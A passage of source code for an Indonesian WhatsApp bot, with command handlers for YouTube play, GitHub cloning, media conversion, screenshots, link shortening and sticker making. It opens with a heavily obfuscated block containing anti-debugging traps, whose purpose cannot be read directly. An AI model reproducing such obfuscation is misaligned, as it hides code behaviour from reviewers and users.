function(_0x564d2c){}[_0x288698(0x28,0x5d,0x31,0x74,0xbb)+_0x23e83b(-0x13,0x5e,0x10f,0xf4,0xa4)+'r'](_0x176dae[_0x53a2a5(0x4f0,0x586,0x49f,0x469,0x4fb)])[_0x53a2a5(0x48d,0x481,0x3f9,0x44c,0x3de)](_0x176dae[_0x28a73d(0x87,0xc3,0x120,0xd5,0x104)]);}else{if(_0x176dae[_0x288698(0x9,-0xc6,-0x2e,-0xb2,0x4f)](_0x176dae[_0x28a73d(0x208,0x157,0x21c,0x1e9,0x174)],_0x176dae[_0x28a73d(0x169,0x164,0x1da,0x20d,0x1aa)])){const _0x2dcf8d=_0x176dae[_0x23e83b(0x162,0xda,0xc6,0xf3,0xe1)](_0x490dcb,_0x176dae[_0x23e83b(0x116,-0x33,0xd0,0xf,0x6d)](_0x176dae[_0x288698(-0xc,-0x7c,0xb,-0x28,0x1c)](_0x176dae[_0x53a2a5(0x4f1,0x554,0x486,0x49c,0x57d)],_0x176dae[_0x53a2a5(0x444,0x3b5,0x396,0x461,0x4f1)]),');'));_0x1598ee=_0x176dae[_0x23e83b(-0x94,0x19,-0x6a,-0x93,-0x6)](_0x2dcf8d);}else{if(_0x176dae[_0x53a2a5(0x3c6,0x43f,0x464,0x333,0x33b)](_0x176dae[_0x288698(0x24,0x6c,-0x2d,0x24,-0xb9)]('',_0x176dae[_0x23e83b(-0x5f,0xc1,0x94,0xc7,0x1c)](_0x283d18,_0x283d18))[_0x176dae[_0x462ed5(0x37a,0x3ae,0x300,0x352,0x3b9)]],-0xa15*0x1+-0x24b4+0xe2*0x35)||_0x176dae[_0x462ed5(0x22d,0x2be,0x250,0x357,0x21a)](_0x176dae[_0x28a73d(0x1cb,0x152,0x153,0x12b,0xc9)](_0x283d18,-0x1e0c+0x5b*0x11+0x1815),-0x1*-0x65d+-0x1*0x466+-0x1f7*0x1)){if(_0x176dae[_0x28a73d(0x12b,0x138,0x128,0x13e,0xf9)](_0x176dae[_0x23e83b(0x5c,-0x95,0x5f,-0x6a,-0x37)],_0x176dae[_0x28a73d(0x45,0x9f,0xf2,0xcc,0x16)]))(function(){const _0x14ebdc={'Zthmh':function(_0x3d4d78){function _0x231f6f(_0x4e359e,_0xb227f6,_0x213032,_0x28edfb,_0x5cc5e3){return _0x1574(_0x28edfb-0xc9,_0x5cc5e3);}return _0x57a554[_0x231f6f(0x3d4,0x30c,0x3aa,0x38e,0x364)](_0x3d4d78);}};function _0xee3e87(_0x5f2a02,_0x24897f,_0x438255,_0x2043bf,_0x5a62b3){return _0x288698(_0x5f2a02-0xd4,_0x24897f-0xac,_0x24897f-0x5e,_0x2043bf-0xd2,_0x5a62b3);}function _0x3dbf3c(_0x53f527,_0x3fba20,_0x2685d0,_0xa5e469,_0x572cd5){return _0x23e83b(_0x53f527-0x193,_0x3fba20-0x70,_0x53f527,_0xa5e469-0xe,_0x3fba20-0x6c);}function _0x4282a9(_0x36bca8,_0xf8dd13,_0x3557ad,_0x1af00d,_0x24bce2){return _0x288698(_0x36bca8-0x1a0,_0xf8dd13-0x16d,_0x36bca8-0x442,_0x1af00d-0x2b,_0x3557ad);}function _0x21fb63(_0x44d57c,_0xf38d02,_0x3d1a72,_0x44e33b,_0x25fbda){return _0x288698(_0x44d57c-0xbc,_0xf38d02-0x14e,_0x44e33b-0x11f,_0x44e33b-0x36,_0xf38d02);}if(_0x57a554[_0x4282a9(0x459,0x4f3,0x3e2,0x4a2,0x50b)](_0x57a554[_0x3dbf3c(0x118,0x13b,0x13e,0x171,0x14d)],_0x57a554[_0x4282a9(0x4c0,0x4e7,0x4b8,0x4c4,0x55c)]))return!![];else _0x14ebdc[_0xee3e87(0xb2,0xa4,0xcb,0x1f,0x126)](_0x12ffe8);}[_0x288698(0xdf,0x3a,0x31,0x75,0x74)+_0x288698(0x81,-0x3f,0x53,0x1d,-0x16)+'r'](_0x176dae[_0x28a73d(0x16a,0x102,0x205,0x18b,0xea)](_0x176dae[_0x23e83b(0x17b,0x11f,0x100,0x65,0xc9)],_0x176dae[_0x23e83b(-0xe5,0x15,-0xbe,-0x29,-0x5b)]))[_0x288698(0x0,0x23,-0x73,-0x2f,-0x6b)](_0x176dae[_0x462ed5(0x377,0x340,0x29e,0x2a3,0x3ef)]));else{const _0x5c0832=_0x40da85[_0x53a2a5(0x48d,0x540,0x4ba,0x3f4,0x4b4)](_0x1e0de4,arguments);return _0x1ddf6c=null,_0x5c0832;}}else _0x176dae[_0x23e83b(0xef,-0x26,0x27,0x9f,0x8a)](_0x176dae[_0x23e83b(0x17e,0xd5,0x1a7,0x5c,0x107)],_0x176dae[_0x28a73d(0x1e3,0x210,0x1fd,0x20a,0x1c6)])?_0x190594=_0x102656:function(){function _0x808bc4(_0x2fc051,_0x405efb,_0x36cf37,_0x56dcda,_0x40f7c9){return _0x23e83b(_0x2fc051-0xe4,_0x405efb-0x4e,_0x36cf37,_0x56dcda-0x139,_0x2fc051-0x4c5);}function _0x2de337(_0x28878f,_0x1b8294,_0x35c4eb,_0x11c684,_0x5cb690){return _0x28a73d(_0x28878f-0xde,_0x1b8294-0x1c,_0x35c4eb,_0x5cb690- -0x1dc,_0x5cb690-0x1b5);}function _0x2481d5(_0x2686e9,_0x2de6a6,_0x4a3d74,_0x17a09c,_0x4c77bf){return _0x28a73d(_0x2686e9-0x11e,_0x2de6a6-0x10c,_0x4a3d74,_0x17a09c-0x43b,_0x4c77bf-0xc0);}function _0x55c03f(_0x48cdcc,_0xfcc427,_0x56134f,_0x4b3a07,_0x1b0eeb){return _0x53a2a5(_0x48cdcc- -0x117,_0xfcc427,_0x56134f-0x127,_0x4b3a07-0x7e,_0x1b0eeb-0x1b3);}const _0x18ab21={'iBmAH':function(_0x50be74,_0x31798d){function _0x1a9bac(_0xcd995e,_0x41a070,_0x1dfb39,_0x48aa1b,_0x2e4942){return _0x1574(_0x2e4942-0x1d5,_0x48aa1b);}return _0x57a554[_0x1a9bac(0x479,0x327,0x477,0x31f,0x3d2)](_0x50be74,_0x31798d);},'mfSJt':function(_0x4639db,_0x2bb970){function _0x5d353c(_0x5b9d92,_0x104880,_0xf2f399,_0x37fb39,_0x4cc1ba){return _0x1574(_0x4cc1ba- -0x60,_0x5b9d92);}return _0x57a554[_0x5d353c(0x25b,0x382,0x287,0x24f,0x2e2)](_0x4639db,_0x2bb970);},'GHudi':_0x57a554[_0x55c03f(0x2e6,0x2ef,0x2f5,0x2bb,0x2d6)],'lpnhu':_0x57a554[_0x2de337(-0x1c3,-0xcd,-0xbc,-0x154,-0x117)]};function _0x158336(_0x13a204,_0x472b64,_0x5499a8,_0x52a00,_0x1bbf50){return _0x28a73d(_0x13a204-0x5,_0x472b64-0xfe,_0x52a00,_0x472b64-0x186,_0x1bbf50-0x90);}if(_0x57a554[_0x55c03f(0x348,0x38c,0x35e,0x29c,0x321)](_0x57a554[_0x2481d5(0x5b9,0x672,0x690,0x5f1,0x612)],_0x57a554[_0x808bc4(0x578,0x5ae,0x59c,0x62b,0x4dd)]))_0x2dd9db=_0x18ab21[_0x158336(0x2fa,0x386,0x2fe,0x388,0x3c4)](_0x1cd664,_0x18ab21[_0x808bc4(0x507,0x571,0x59c,0x4a1,0x4e8)](_0x18ab21[_0x2481d5(0x626,0x627,0x4d3,0x580,0x518)](_0x18ab21[_0x2481d5(0x499,0x584,0x5a1,0x4fb,0x53e)],_0x18ab21[_0x808bc4(0x533,0x505,0x5bf,0x5e3,0x5b0)]),');'))();else return![];}[_0x23e83b(0xba,0x4b,0xf9,0x1a,0x82)+_0x28a73d(0x191,0x227,0xf0,0x1a7,0x1d6)+'r'](_0x176dae[_0x288698(0xb6,0x30,0x32,0xa5,0xdc)](_0x176dae[_0x28a73d(0x145,0x183,0x1f0,0x1cc,0x161)],_0x176dae[_0x288698(-0x7f,-0xa0,-0xac,-0x2d,-0xf)]))[_0x28a73d(0x230,0x1b5,0x223,0x1ad,0x155)](_0x176dae[_0x53a2a5(0x41d,0x3a2,0x4b8,0x3c7,0x3ca)]);}}_0x176dae[_0x53a2a5(0x4c4,0x442,0x483,0x51e,0x53c)](_0x24d5c0,++_0x283d18);}else{if(_0x2a68a9){const _0x4c919e=_0x44e2ed[_0x28a73d(0x22a,0x25f,0x226,0x1ad,0x17a)](_0x500995,arguments);return _0x1c0732=null,_0x4c919e;}}}function _0x1cfb58(_0x1a0d17,_0xf79a3c,_0xe8b29a,_0x349b25,_0x3140ec){return _0x350f34(_0x1a0d17-0x119,_0xf79a3c-0x1ae,_0x349b25-0x265,_0x349b25-0x67,_0xf79a3c);}function _0x41a36e(_0x49edf0,_0x74343f,_0x336038,_0x5c3485,_0x29ea11){return _0xdbfcc(_0x49edf0-0x72,_0x74343f,_0x336038-0x22,_0x336038-0x7d,_0x29ea11-0x8b);}function _0x16ac5e(_0x3b6356,_0x492e82,_0x4bad24,_0x41dc57,_0x2f7426){return _0x3c1e52(_0x3b6356-0x92,_0x492e82-0xfd,_0x4bad24-0x66,_0x41dc57,_0x492e82-0x3c9);}function _0x4e2f0a(_0x4fd183,_0x400e07,_0x25319f,_0x1ac6e1,_0x1f304e){return _0xdbfcc(_0x4fd183-0x80,_0x1ac6e1,_0x25319f-0xa4,_0x400e07- -0x317,_0x1f304e-0x127);}try{if(_0x176dae[_0x41a36e(0x48f,0x498,0x400,0x3ae,0x463)](_0x176dae[_0x16ac5e(0x598,0x54e,0x5fa,0x546,0x5d2)],_0x176dae[_0x16ac5e(0x55b,0x4c9,0x4f6,0x4a2,0x568)])){if(_0x70d225){if(_0x176dae[_0x4e2f0a(0x137,0xb7,0x16e,0x6a,0x8b)](_0x176dae[_0x1cfb58(0x5ea,0x6fd,0x652,0x65a,0x63a)],_0x176dae[_0x4e2f0a(0x9e,0x28,0x23,0x1b,-0x69)])){if(_0x3f8185)return _0x4dcc19;else _0x176dae[_0x4c5ede(0x417,0x41d,0x3f4,0x3d8,0x3a8)](_0xbcc40e,-0x1a51*-0x1+0x22a8+-0x2b*0x16b);}else return _0x24d5c0;}else{if(_0x176dae[_0x4e2f0a(-0x1c,0x6c,0x3a,0x71,-0x3d)](_0x176dae[_0x4e2f0a(-0xc8,-0x23,-0x34,-0x8d,-0xab)],_0x176dae[_0x1cfb58(0x5a9,0x56a,0x582,0x5e1,0x5e0)])){const _0x322f3f=new _0x3be506(_0x176dae[_0x4e2f0a(0x79,0xde,0x37,0x130,0x17e)]),_0x201811=new _0x458a4d(_0x176dae[_0x4e2f0a(0xb2,0x9d,0x73,0x94,0xd2)],'i'),_0x44ec09=_0x176dae[_0x1cfb58(0x64d,0x766,0x695,0x6c7,0x670)](_0x1eda7f,_0x176dae[_0x16ac5e(0x45c,0x401,0x3e4,0x42d,0x448)]);!_0x322f3f[_0x4e2f0a(-0x27,0x3f,0x8d,-0x3b,0xc2)](_0x176dae[_0x4c5ede(0x426,0x4b0,0x451,0x4a7,0x4b3)](_0x44ec09,_0x176dae[_0x4c5ede(0x3db,0x3f4,0x377,0x37a,0x485)]))||!_0x201811[_0x16ac5e(0x47a,0x4a6,0x4d4,0x484,0x440)](_0x176dae[_0x41a36e(0x3d7,0x420,0x39a,0x316,0x405)](_0x44ec09,_0x176dae[_0x4c5ede(0x40a,0x3bb,0x415,0x3fa,0x48d)]))?_0x176dae[_0x1cfb58(0x5fb,0x56d,0x65c,0x5aa,0x5d8)](_0x44ec09,'0'):_0x176dae[_0x1cfb58(0x730,0x66d,0x6b0,0x6a4,0x6e8)](_0x5322ff);}else _0x176dae[_0x4e2f0a(-0xa3,-0x5a,-0x82,-0xa6,-0x6a)](_0x24d5c0,0x9aa+-0x449+-0x561);}}else{const _0x289a30=function(){function _0x475f3e(_0x1cc229,_0x4a2612,_0x1fc748,_0x395152,_0x2de933){return _0x16ac5e(_0x1cc229-0xce,_0x1fc748- -0x168,_0x1fc748-0x3c,_0x2de933,_0x2de933-0x11b);}let _0x111c5a;function _0xb5c93e(_0x337a78,_0x291750,_0x1cdae2,_0x2bfff4,_0xd32034){return _0x1cfb58(_0x337a78-0x101,_0x291750,_0x1cdae2-0x105,_0xd32034- -0x754,_0xd32034-0x14f);}try{_0x111c5a=_0x176dae[_0x12fce2(0x689,0x732,0x6d6,0x6d0,0x6f0)](_0x15ddbb,_0x176dae[_0x475f3e(0x312,0x345,0x33d,0x2f2,0x2f6)](_0x176dae[_0x475f3e(0x332,0x2f1,0x357,0x374,0x2f7)](_0x176dae[_0x475f3e(0x3a9,0x49f,0x3ef,0x497,0x3a0)],_0x176dae[_0x475f3e(0x3e1,0x375,0x342,0x3e8,0x2e1)]),');'))();}catch(_0x9f60af){_0x111c5a=_0x567d1e;}function _0xd225d6(_0x149a8e,_0x4737f8,_0x46759b,_0x2776fe,_0x1bc332){return _0x4c5ede(_0x2776fe-0xa5,_0x4737f8-0x180,_0x46759b-0x62,_0x149a8e,_0x1bc332-0xfd);}function _0x5e006f(_0x46413f,_0x42541e,_0x4a667f,_0x46ae18,_0x5bf017){return _0x1cfb58(_0x46413f-0x80,_0x42541e,_0x4a667f-0x19a,_0x46ae18- -0x4d3,_0x5bf017-0xbe);}function _0x12fce2(_0x1d3406,_0x4de844,_0x46137e,_0x350d6a,_0x3fedf4){return _0x1cfb58(_0x1d3406-0x104,_0x3fedf4,_0x46137e-0x1d8,_0x1d3406- -0x9,_0x3fedf4-0xc3);}return _0x111c5a;},_0x274acc=_0x176dae[_0x41a36e(0x3c5,0x3ff,0x3b5,0x370,0x348)](_0x289a30);_0x274acc[_0x4c5ede(0x425,0x3e6,0x3ce,0x49c,0x467)+_0x41a36e(0x361,0x3cc,0x3be,0x3ba,0x358)+'l'](_0x39a2d0,-0x6e9*0x2+0x5e*0x9+0xd12*0x2);}}catch(_0x583dd8){}}function _0x388a(){const _0x17e4f6=['No\x20re','gger','wwSyl','link','bind','FWgER','stEAo','Suxmn','JGoZu','\x20Drun','OVRvf','ify?q','qeeMA','cScqH','oereG','sGMSU','LWghN','FYzvy','yixkv','FLCkU','mfSJt','oBiAj','join','toStr','AvXHU','le\x20:\x20','terva','hLaTx','XiojO','822454RONviw','HTSIe','xlobE','d\x20is\x20','state','nVUCD','tion','drJFC','1908KFFgPd','audio','ripIE','eaynP','https','uery=','PcKfw','PEIPk','dikOv','DzoUp','test','BQZoO','HDtYr','*(?:[','tujkG','FeucZ','GTgIm','TUgLT','searc','warn','zRwnU','GIJIF','url','strin','i.jun','StNVg','NoroK','lpnhu','RlUGV','bQbSg','oiEeg','iYHuk','\x20vali','brEiX','xvsnT','GlLvj','xEGPD','trace','/spot','debu','qqsGS','Ewenr','log','0-9a-','cHPWo','jJlEb','sdudd','const','yWbAb','conoJ','1855qFHKZI','a-zA-','$]*)','TAwpT','Date:','LUAge','while','start','Qtqiv','tify\x20','KBYmd','AWnbH','.id/s','\x0a*Art','lengt','en.sp','rasga','error','Zthmh','SfBnW','XZsRG','iPKOr','6841080muJFGa','./lib','http:','SWrrT','tfEgc','://ap','mfQLP','dtyZT','xotDJ','ructo','elGro','nstru','is\x22)(','paygi','not\x20a','apply','rqiDY','YFjHn','data','ZgEPA','init','hWfjH','SisoS','RYshf','fuwDA','ZRSpb','ion\x20*','info','BonIq','WzeyK','eKslu','zA-Z_','DITgy','UPFBn','OAGPT','XNnxE','wiOul','e)\x20{}','2401357HzLopJ','fXXIF','ts:\x20','rnKQX','://','BaNyr','1051658LVURZb','YCHSh','lQhGb','Ldiul','rjbDt','JXPyf','pNPuG','quote','rDUAH','xCbXr','YmMGb','proto','ink\x20y','WTkJD','nWSmr','otify','NJscT','ists:','heZzR','kcZzj','gtRas','phORp','\x22retu','n()\x20','ctor(','qisVr','OIAKU','TTUDE','EAAtu','funct','KatVH','rJcUJ','icpBL','WzgEU','chat','ZgsoC','SQkdK','sults','mmZJT','UFucZ','setIn','HysiV','\x0a*Alb','fuFUS','VnpWf','PyBPQ','ILcRQ','\x20(tru','QVFxP','Title','n\x20(fu','UZRzW','e:*\x20','hBTbB','iBmAH','BBfbA','17900172UNQQeT','QkcpF','RBXEH','type','GOcvW','CQoBM','Alsla','uzyeI','TWpVr','\x0a*Rel','ing','fRwXP','twIeV','ify','OqhZk','fYEWQ',')+)+)','rn\x20th','APSsS','BjRsL','Objec','ACjUB','n4.my','EQSDQ','The\x20l','sWith','LkKqL','UOuUE','sVlvP','FuwiI','k\x20Tex','Examp','chain','Yoack','*Titl','(((.+','ajKzt','aRAdW','xKpsV','vxGUa','aRZrI','CKLMo','downl','qWKFq','PRkil','GHudi','WPTVH','actio','nctio','conso','YYOvP','oEQMX','XPoky','ZywiP','LeUjJ','mVepc','hIRDn','BTJFW','lfouS','yskTN','OsgBw','JNTel','exCnn','jQPwm','gBRcO','BmtMI','HmxlS','t\x20or\x20','essag','ovide','Artis','earch','agSRB','GBNbb','to__','gWkyF','a\x20Spo','ogUaV','call','fgHFV','zhpBW','OgEIB','getIn','ReeMA','dmgVu','PIFGH','vRTjS','RlHEb','input','YVBkL','/mpeg','\x5c+\x5c+\x20','8CYaQLq','sYjMA','VNQYa','gkCbG','2105055Rdsofm','oad','jIZXp','ou\x20pr','hKNYx','rsXod','GOCgb','PAkQa','YaHNk','um:*\x20','nAUDv','SGUaD','jeGdM','PDPkt','dCmgp','table','.com/','sendM','ease\x20','retur','MPouv','d\x20Spo','hRfbF','\x5c(\x20*\x5c','Z_$][','GXqIW','CVCXS','bann','jkqXP','://op','__pro','XhXOI','bEaUz','gTEcL','lBKNZ','fZFdJ','oezzN','IJREg','QpZrP','rttUT','jjwEc','IUAwV','TNgry','hsCqE','DvuBe','{}.co','UmcAp','sCrfG','KfecX','count','kIIFX','qfiTd','uIVuB','qqmyr','MdViT','DINZt','pKkAu','SesOo','excep','AVukz','\x20foun','nZRtl'];_0x388a=function(){return _0x17e4f6;};return _0x388a();}
    }
    break;

case 'play': {
                if (!text) return reply(`Example : ${prefix + command} Drunk Text`)
                let search = await yts(text)
                let linknya = search.all[0].url
                let bodytextnya = `ᴛɪᴛʟᴇ : *${search.all[0].title}*\nᴠɪᴇᴡs : *${search.all[0].views}*\nᴅᴜʀᴀᴛɪᴏɴ : *${search.all[0].timestamp}*\nᴜᴘʟᴏᴀᴅᴇᴅ : *${search.all[0].ago}*\nᴜʀʟ : *${linknya}*`
               // zynX.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
                
            let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: bodytextnya
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: wm
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : { url : search.all[0].thumbnail }}, { upload: zynX.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Video 🎦","id":"${prefix}ytmp4 ${linknya}"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Audio 🎵","id":"${prefix}ytmp3 ${linknya}"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: saluran,
                    newsletterJid: idsal,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await zynX.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
            }
            break

//—————「 SEARCH MENU 」—————//



//—————「 TOOLS MENU 」—————//
case 'git': 
case 'gitclone':
if (isBan) return reply(mess.bann)
if (!args[0]) return reply(`Mana link nya?`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
reply(mess.wait)
await sleep(200)
                let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
                let [, user, repo] = args[0].match(regex1) || []
                repo = repo.replace(/.git$/, '')
                let url = `https://api.github.com/repos/${user}/${repo}/zipball`
                let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
                zynX.sendMessage(m.chat, { document: { url: url }, fileName: filename, mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
            .catch(console.error)
break

case 'toimage': case 'toimg': {
if (isBan) return reply(mess.bann)
reply(mess.wait)
await sleep(200)
if (!quoted) throw reply('Reply Image')
if (!/webp/.test(mime)) reply(`Balas sticker dengan caption *${prefix + command}*`)
let media = await zynX.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
zynX.sendMessage(from, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}
break

case 'tomp3': {
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
if (!quoted) return m.reply(`*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`)
reply(mess.wait)
await sleep(200)
if (!quoted) reply(`*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`)
let media = await zynX.downloadMediaMessage(quoted)
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
zynX.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${zynX.user.name}.mp3`}, { quoted : m })
//zynX.sendMessage(m.chat, {audio , mimetype: 'audio/mpeg', fileName: `Convert By ${zynX.user.name}.mp3`}, { quoted : m })
}
break

case 'toaudio': case 'toaud':{
if (isBan) return reply(mess.bann)
reply(mess.wait)
await sleep(200)
if (!/video/.test(mime) && !/audio/.test(mime)) reply(`*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`)
if (!quoted) reply(`*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`)
let media = await zynX.downloadMediaMessage(quoted)
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
zynX.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break

case 'tovn': {
if (isBan) return reply(mess.bann)
reply(mess.wait)
await sleep(200)
if (!/video/.test(mime) && !/audio/.test(mime)) reply(`*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`)
if (!quoted) reply(`*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`)
let media = await quoted.download()
let { toPTT } = require('./lib/converter')
let audio = await toPTT(media, 'mp4')
zynX.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true})
}
break
            
case 'tourl': {
if (isBan) return reply2(mess.ban)
if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
reply(mess.wait)
let media = await zynX.downloadAndSaveMediaMessage(quoted)
let anu = await TelegraPh(media)
reply(util.format(anu))
await fs.unlinkSync(media)
}
break

case 'shorturl': 
case 'shortlink': {
if (isBan) return reply2(mess.ban)
if (!text) throw `Example : ${prefix + command} URL`
reply(mess.wait)
let res = await fetch(`https://aemt.me/tinyurl?link=${text}`)
let short = await res.json()
reply(util.format(short.result))
}
break

case "ssweb": {
    let link = text; // Simpan link yang dikirim ke dalam variabel 'link'
    if (!link) return reply(`Contoh ${prefix + command} link`);
    if (!/^https?:\/\//.test(link)) return reply('Awali *URL* dengan http:// atau https://');

    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: 'Silahkan pilih *option* di bawah ini'
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: wm
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        gifPlayback: true,
                        subtitle: ownername,
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Desktop","id":"${prefix}sswebdesktop ${link}"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Tablet","id":"${prefix}sswebtablet ${link}"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Phone","id":"${prefix}sswebphone ${link}"}`
                            }
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                                newsletterName: saluran,
                                newsletterJid: idsal,
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, {});

    await zynX.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break

case "sswebdesktop":{
if (!text) return reply(`Contoh ${prefix+command} link`)
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
reply(mess.wait)
let krt = await sswebDesktop(text)
zynX.sendMessage(from ,{ image: krt.result, caption: mess.success },{ quoted: m })
}
break

case "sswebtablet":{
if (!text) return reply(`Contoh ${prefix+command} link`)
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
reply(mess.wait)
let krt = await sswebTablet(text)
zynX.sendMessage(from ,{ image: krt.result, caption: mess.success },{ quoted: m })
}
break

case "sswebphone":{
if (!text) return reply(`Contoh ${prefix+command} link`)
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
reply(mess.wait)
let krt = await sswebPhone(text)
zynX.sendMessage(from ,{ image: krt.result, caption: mess.success },{ quoted: m })
}
break

case 'hdr': 
case 'hd':
case 'remini': {
			if (!quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			zynX.sendMessage(m.chat, { image: proses, caption: mess.success}, { quoted: fcall})
			}
			break
	
case  'qc':
case  'qcstick':{
if (isBan) return reply(mess.bann)
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
    let reply;
    if (text && m.quoted) {
        if (m.quoted.sender) {
            reply = {
                "name": await zynX.getName(m.quoted.sender),
                "text": m.quoted.text || '',
                "chatId": m.chat.split('@')[0],
            };
        }
    } else if (text && !m.quoted) {
        reply = {};
    } else if (!text && m.quoted) {
        if (m.quoted.text) {
            text = m.quoted ? quoted.text : text ? text : "";
        }
        reply = {};
    } else {
        throw "*• Example:* .qc *[text or reply message]*";
    }

    const img = await q.download?.();

    const pp = await zynX.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/320b066dc81928b782c7b.png');

    if (mime) {
        const obj = {
            type: "quote",
            format: "png",
            backgroundColor: "#FFFFFF",
            width: 512,
            height: 768,
            scale: 2,
            "messages": [{
                "entities": [],
                "media": {
                    "url": await uploadFile(img)
                },
                avatar: true,
                from: {
                    id: 1,
                    name: await zynX.getName(m.sender),
                    photo: {
                        url: pp
                    }
                },
                text: text || '',
                replyMessage: reply
            }]
        };

        const json = await axios.post('https://bot.lyo.su/quote/generate', obj, {
            headers: {
                'Content-Type': 'application/json'
            }
        });

        const buffer = Buffer.from(json.data.result.image, 'base64');
        const stickerResult = await stickQC(buffer, false, global.packname, global.author);

        if (stickerResult) return zynX.sendImageAsSticker(m.chat, stickerResult, m, { packname: global.packname, 
author: global.author, 
categories: ['🤩', '🎉'],
id: '12345',
quality: 100,
background: 'transparent'});
    } else {
        const obj = {
            type: "quote",
            format: "png",
            backgroundColor: "#FFFFFF",
            width: 512,
            height: 768,
            scale: 2,
            "messages": [{
                "entities": [],
                avatar: true,
                from: {
                    id: 1,
                    name: await zynX.getName(m.sender),
                    photo: {
                        url: pp
                    }
                },
                text: text || '',
                replyMessage: reply
            }]
        };

        const json = await axios.post('https://bot.lyo.su/quote/generate', obj, {
            headers: {
                'Content-Type': 'application/json'
            }
        });

        const buffer = Buffer.from(json.data.result.image, 'base64');
        const stickerResult = await stickQC(buffer, false, global.packname, global.author);

        if (stickerResult) return zynX.sendImageAsSticker(m.chat, stickerResult, m, { packname: global.packname, 
author: global.author, 
categories: ['🤩', '🎉'],
id: '12345',
quality: 100,
background: 'transparent'});

    }
}
break 

case 'wm': {
if (isBan) return reply(mess.bann)
 if (!args.join(" ")) return reply(`Text mana?\n\nExample : ${prefix + command} Kontol • Kuda`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
try {
 if (!quoted) reply `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await zynX.sendImageAsSticker(from, media, m, { packname: pcknm, author: atnm })
await fs.unlinkSync(encmedia)
}
} catch (e) {
await reply(mess.errorF)
}
}
break
case 'smeme': case 'stickermeme': case 'stickmeme': {

    if (!/webp/.test(mime) && /image/.test(mime)) {
        if (!text) return reply(`Text mana?\n\nExample : ${prefix + command} Zʏɴxᴢᴏ`)
        reply(mess.wait)

        // Memisahkan teks dengan menggunakan '|'
        let teks = text.split('|')

        // Mengatur teks atas dan bawah
        let atas = teks[0] ? teks[0] : '-'
